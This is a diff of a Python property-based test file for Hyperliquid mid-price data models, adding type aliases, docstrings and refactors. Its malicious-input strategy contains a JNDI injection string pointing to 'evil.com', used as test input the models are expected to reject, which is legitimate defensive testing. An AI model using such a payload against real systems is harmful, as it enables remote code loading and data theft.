@@ -1,7 +1,7 @@
 """Property-based tests for Hyperliquid raw all mids models.
 
 These tests validate critical security boundary models that process external mid-price data.
-The models tested here are essential for price discovery, market data aggregation, and trading decisions.
+The models tested here are essential for price discovery, market data aggregation, and trades.
 
 SECURITY CRITICAL: These raw models protect against:
 - Malicious price data that could manipulate trading decisions
@@ -16,7 +16,7 @@ Property testing ensures comprehensive coverage of price edge cases and adversar
 
 import json
 from decimal import Decimal
-from typing import Any, Literal
+from typing import Literal
 
 import pytest
 from hypothesis import assume, given, strategies as st
@@ -32,13 +32,20 @@ from cyberdelta.apis.hyperliquid.models.hl_raw_all_mids import (
 from cyberdelta.exceptions.parsing import EmptyStringError
 
 
+# Type alias for malicious input types to avoid long lines
+MaliciousInput = str | int | float | bool | list[str] | dict[str, str] | bytes | None
+
 # =============================================================================
 # HYPOTHESIS STRATEGIES FOR ALL MIDS MODEL TESTING
 # =============================================================================
 
 
 def asset_symbol_strategy() -> SearchStrategy[str]:
-    """Generate valid asset symbol strings."""
+    """Generate valid asset symbol strings.
+
+    Returns:
+        SearchStrategy[str]: Strategy for generating valid asset symbols.
+    """
     return st.one_of([
         # Common cryptocurrencies
         st.sampled_from([
@@ -94,7 +101,11 @@ def asset_symbol_strategy() -> SearchStrategy[str]:
 
 
 def mid_price_strategy() -> SearchStrategy[str]:
-    """Generate valid mid-price decimal strings."""
+    """Generate valid mid-price decimal strings.
+
+    Returns:
+        SearchStrategy[str]: Strategy for generating valid mid-price decimal strings.
+    """
     return st.one_of([
         # Common price values
         st.decimals(min_value=Decimal("0.00000001"), max_value=Decimal(1000000), places=8).map(str),
@@ -123,7 +134,11 @@ def mid_price_strategy() -> SearchStrategy[str]:
 
 @st.composite
 def valid_all_mids_data(draw: st.DrawFn, num_assets: int | None = None) -> dict[str, str]:
-    """Generate valid all mids data."""
+    """Generate valid all mids data.
+
+    Returns:
+        dict[str, str]: Dictionary mapping asset symbols to mid prices.
+    """
     if num_assets is None:
         num_assets = draw(st.integers(min_value=0, max_value=100))
 
@@ -135,7 +150,7 @@ def valid_all_mids_data(draw: st.DrawFn, num_assets: int | None = None) -> dict[
             symbols.add(symbol)
 
     # Generate prices for each symbol
-    mids_data = {}
+    mids_data: dict[str, str] = {}
     for symbol in symbols:
         price = draw(mid_price_strategy())
         mids_data[symbol] = price
@@ -145,13 +160,21 @@ def valid_all_mids_data(draw: st.DrawFn, num_assets: int | None = None) -> dict[
 
 @st.composite
 def valid_all_mids_wrapper_data(draw: st.DrawFn) -> dict[Literal["mids"], dict[str, str]]:
-    """Generate valid all mids wrapper data for WebSocket messages."""
+    """Generate valid all mids wrapper data for WebSocket messages.
+
+    Returns:
+        dict[Literal["mids"], dict[str, str]]: Wrapper data for WebSocket messages.
+    """
     mids_data = draw(valid_all_mids_data())
     return {"mids": mids_data}
 
 
-def malicious_mids_strategy() -> SearchStrategy[Any]:
-    """Generate malicious values for all mids security testing."""
+def malicious_mids_strategy() -> SearchStrategy[MaliciousInput]:
+    """Generate malicious values for all mids security testing.
+
+    Returns:
+        SearchStrategy[MaliciousInput]: Strategy for generating malicious input values.
+    """
     return st.one_of([
         # Price manipulation attempts
         st.just("${jndi:ldap://evil.com/steal-prices}"),
@@ -208,16 +231,16 @@ class TestHyperliquidRawAllMidsProperties:
 
     @given(mids_data=valid_all_mids_data())
     def test_all_mids_validation_success_properties(self, mids_data: dict[str, str]) -> None:
-        """Property: Valid all mids data should always create valid HyperliquidRawAllMids objects."""
+        """Property: Valid data should create valid HyperliquidRawAllMids."""
         # Skip invalid data
         for symbol, price in mids_data.items():
             try:
                 # Validate symbol
-                assume(isinstance(symbol, str) and symbol.strip())
+                assume(symbol.strip())
                 assume(len(symbol.encode("utf-8")) <= 64)
 
                 # Validate price
-                assume(isinstance(price, str) and price.strip())
+                assume(price.strip())
                 decimal_val = Decimal(price.strip())
                 assume(decimal_val.is_finite())
 
@@ -242,29 +265,44 @@ class TestHyperliquidRawAllMidsProperties:
         malicious_value=malicious_mids_strategy(),
     )
     def test_all_mids_security_boundary_properties(
-        self, mids_data: dict[str, str], malicious_value: Any
+        self,
+        mids_data: dict[str, str],
+        malicious_value: MaliciousInput,
     ) -> None:
-        """Property: All mids model should reject malicious inputs safely."""
+        """Property: All mids model should reject malicious inputs."""
         # Skip if empty
         assume(len(mids_data) > 0)
 
         # Replace one value with malicious input
-        symbol = list(mids_data.keys())[0]
-        mids_data[symbol] = malicious_value
+        symbol = next(iter(mids_data.keys()))
+        mids_data_malicious: dict[str, object] = dict(mids_data)
+        mids_data_malicious[symbol] = malicious_value
 
         # Property: Malicious price should be rejected
         with pytest.raises((ValidationError, TypeError, EmptyStringError, TypeFieldError)):
-            HyperliquidRawAllMids.model_validate(mids_data)
+            HyperliquidRawAllMids.model_validate(mids_data_malicious)
 
     @given(malicious_symbol=malicious_mids_strategy(), price=mid_price_strategy())
-    def test_all_mids_malicious_symbol_properties(self, malicious_symbol: Any, price: str) -> None:
+    def test_all_mids_malicious_symbol_properties(
+        self,
+        malicious_symbol: MaliciousInput,
+        price: str,
+    ) -> None:
         """Property: All mids model should reject malicious symbols safely."""
         # Skip valid strings that might pass
-        if isinstance(malicious_symbol, str):
-            if malicious_symbol.strip() and len(malicious_symbol.encode("utf-8")) <= 64:
-                assume(False)  # Skip potentially valid symbols
+        if (
+            isinstance(malicious_symbol, str)
+            and malicious_symbol.strip()
+            and len(malicious_symbol.encode("utf-8")) <= 64
+        ):
+            assume(False)  # Skip potentially valid symbols
 
-        mids_data = {malicious_symbol: price}
+        # Convert to string key for dict (testing malicious input handling)
+        try:
+            symbol_key = str(malicious_symbol)
+        except Exception:
+            symbol_key = repr(malicious_symbol)
+        mids_data = {symbol_key: price}
 
         # Property: Malicious symbol should be rejected
         with pytest.raises((ValidationError, TypeError, EmptyStringError, TypeFieldError)):
@@ -341,7 +379,9 @@ class TestHyperliquidRawAllMidsProperties:
             st.none(),  # None instead of dict
         ])
     )
-    def test_all_mids_type_validation_properties(self, invalid_input: Any) -> None:
+    def test_all_mids_type_validation_properties(
+        self, invalid_input: list[str] | str | float | bool | None
+    ) -> None:
         """Property: All mids should reject non-dictionary inputs."""
         with pytest.raises((ValidationError, TypeError, TypeFieldError)):
             HyperliquidRawAllMids.model_validate(invalid_input)
@@ -352,8 +392,8 @@ class TestHyperliquidRawAllMidsProperties:
         # Skip invalid data
         for symbol, price in mids_data.items():
             try:
-                assume(isinstance(symbol, str) and symbol.strip())
-                assume(isinstance(price, str) and price.strip())
+                assume(symbol.strip())
+                assume(price.strip())
                 decimal_val = Decimal(price.strip())
                 assume(decimal_val.is_finite())
             except (ValueError, TypeError):
@@ -442,14 +482,14 @@ class TestHyperliquidRawAllMidsWrapperProperties:
     def test_all_mids_wrapper_validation_success_properties(
         self, wrapper_data: dict[Literal["mids"], dict[str, str]]
     ) -> None:
-        """Property: Valid wrapper data should always create valid HyperliquidRawAllMidsWrapper objects."""
+        """Property: Valid wrapper data should create valid HyperliquidRawAllMidsWrapper."""
         # Skip invalid data
         mids_data = wrapper_data["mids"]
         for symbol, price in mids_data.items():
             try:
-                assume(isinstance(symbol, str) and symbol.strip())
+                assume(symbol.strip())
                 assume(len(symbol.encode("utf-8")) <= 64)
-                assume(isinstance(price, str) and price.strip())
+                assume(price.strip())
                 decimal_val = Decimal(price.strip())
                 assume(decimal_val.is_finite())
             except (ValueError, TypeError):
@@ -477,7 +517,9 @@ class TestHyperliquidRawAllMidsWrapperProperties:
             st.just({"mids": []}),
         ])
     )
-    def test_all_mids_wrapper_invalid_structure_properties(self, invalid_wrapper: Any) -> None:
+    def test_all_mids_wrapper_invalid_structure_properties(
+        self, invalid_wrapper: dict[str, str | list[object] | None]
+    ) -> None:
         """Property: Wrapper should reject invalid structures."""
         with pytest.raises(ValidationError):
             HyperliquidRawAllMidsWrapper.model_validate(invalid_wrapper)
@@ -501,11 +543,18 @@ class TestHyperliquidRawAllMidsIntegrationProperties:
         ),
     )
     def test_all_mids_models_adversarial_input_properties(
-        self, mids_data: dict[str, str], malicious_entries: dict[Any, Any]
+        self,
+        mids_data: dict[str, str],
+        malicious_entries: dict[
+            str | int | float | bool | list[str] | dict[str, str] | bytes | None,
+            str | int | float | bool | list[str] | dict[str, str] | bytes | None,
+        ],
     ) -> None:
         """Property: All mids models should safely handle adversarial input."""
         # Mix valid and malicious data
-        mixed_data = {**mids_data, **malicious_entries}
+        # Convert malicious entries to have string keys for type compatibility
+        string_malicious_entries = {str(k): v for k, v in malicious_entries.items()}
+        mixed_data: dict[str, object] = {**mids_data, **string_malicious_entries}
 
         # Property: Mixed adversarial input should be rejected
         with pytest.raises((ValidationError, TypeError, TypeFieldError, EmptyStringError)):
@@ -517,8 +566,8 @@ class TestHyperliquidRawAllMidsIntegrationProperties:
         # Skip invalid data
         for symbol, price in mids_data.items():
             try:
-                assume(isinstance(symbol, str) and symbol.strip())
-                assume(isinstance(price, str) and price.strip())
+                assume(symbol.strip())
+                assume(price.strip())
                 decimal_val = Decimal(price.strip())
                 assume(decimal_val.is_finite())
             except (ValueError, TypeError):
@@ -606,7 +655,8 @@ def test_HyperliquidRawAllMids_decimal_normalization() -> None:
     assert Decimal(obj.root["BTC"]) == Decimal(40000)
     # Excessive precision may be rounded
     sol_tuple = Decimal(obj.root["SOL"]).as_tuple()
-    assert isinstance(sol_tuple.exponent, int) and sol_tuple.exponent >= -8
+    assert isinstance(sol_tuple.exponent, int)
+    assert sol_tuple.exponent >= -8
 
 
 def test_HyperliquidRawAllMids_scientific_notation() -> None:
